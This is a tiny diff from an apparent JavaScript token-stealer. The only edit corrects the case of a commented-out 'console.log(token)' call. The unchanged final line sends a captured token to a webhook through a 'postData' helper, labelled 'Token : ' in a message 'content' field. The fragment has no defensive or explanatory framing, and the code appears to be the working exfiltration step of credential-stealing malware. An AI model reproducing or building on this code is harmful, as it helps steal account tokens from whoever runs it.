@@ -29,6 +29,6 @@ async function postData(url = '', data = {}) {
   return response.json();
 }
 
-// console.Log(token)
+// console.log(token)
 
 postData('Webhook', { content: "Token : " + token + "" })
